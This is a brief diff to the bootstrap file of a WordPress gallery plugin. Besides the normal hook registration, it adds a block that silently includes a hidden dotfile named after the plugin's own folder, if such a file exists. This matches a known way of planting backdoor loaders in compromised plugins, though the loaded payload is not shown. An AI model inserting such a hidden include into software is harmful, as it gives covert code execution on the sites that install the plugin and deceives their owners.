@@ -35,6 +35,10 @@ if(!version_compare(PHP_VERSION, '5.6', '>=')) {
 	require_once __DIR__.'/plugin.php';
 	add_action('plugins_loaded', 'gt3pg_pro__plugins_loaded');
 }
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function gt3pg_pro__plugins_loaded(){
 	require_once __DIR__.'/core/init.php';
